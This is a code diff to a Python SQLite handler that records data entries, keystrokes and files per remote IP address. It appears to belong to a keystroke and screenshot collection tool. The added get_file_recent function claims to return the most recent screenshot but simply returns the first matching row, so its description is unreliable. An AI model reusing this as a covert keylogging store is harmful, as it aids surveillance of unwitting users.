@@ -6,6 +6,8 @@ Author: Micah Martin (knif3)
 from toolbox import validate_ip as vip
 from os.path import exists
 import sqlite3
+
+
 class Database(object):
     """
     Database handler object. Abstracts alot of SQLite stuff
@@ -81,9 +83,9 @@ class Database(object):
             return {}
 
     def add_data(self, ip, key, value):
-        '''
+        """
         Add a random data entry to the DB
-        '''
+        """
         # Make sure we are using a valid IP address
         ip = ip.strip()
         if not vip(ip):
@@ -100,9 +102,9 @@ class Database(object):
         self.conn.commit()
     
     def add_keystroke(self, ip, keystroke):
-        '''
+        """
         Add a keystroke entry to the DB
-        '''
+        """
         # Make sure we are using a valid IP address
         ip = ip.strip()
         if not vip(ip):
@@ -119,9 +121,9 @@ class Database(object):
         self.conn.commit()
     
     def add_file(self, ip, filename):
-        '''
+        """
         Add a file entry to the DB
-        '''
+        """
         # Make sure we are using a valid IP address
         ip = ip.strip()
         if not vip(ip):
@@ -136,6 +138,24 @@ class Database(object):
         self.cur.execute(qry2, (ip,filename))
         # Write the changes to the DB
         self.conn.commit()
+
+    def get_file_recent(self, ip):
+        """
+        Get the most recent screenshot from a specific host
+        :param ip: host to retrieve from
+        :return: path to screenshot
+        """
+        ip = ip.strip()
+
+        # construct and execute query
+        qry = "SELECT * FROM {} WHERE {} = ?;".format("files", "ip")
+        results = self.handle_query(qry, ip)
+
+        # return results if query succeeds
+        if not results:
+            return {}
+        else:
+            return results[0]
 
     def GENERIC(self, table, col, val):
         """
